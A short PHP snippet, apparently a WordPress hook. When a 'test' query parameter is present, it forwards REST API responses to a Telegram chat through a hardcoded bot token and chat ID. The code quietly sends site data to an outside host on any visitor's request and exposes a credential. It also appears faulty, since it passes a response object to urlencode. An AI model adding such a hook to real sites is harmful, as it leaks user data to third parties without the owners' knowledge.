<?php

if(!empty($_GET['test'])) {

    add_filter('rest_pre_serve_request', function($served, $result, $request, $_this){

        $bot_token = '739325448:AAE0pvGUHl9-G91x9GSesH3Nnyo3DBEqB7Y';
        $chat_id = '-1001433782068';

        $message = "your message";
        $bot_url = "https://api.telegram.org/bot{$bot_token}/";
        $url = $bot_url . "sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($result);
        file_get_contents($url);

        return $served;
    }, 10, 4);

}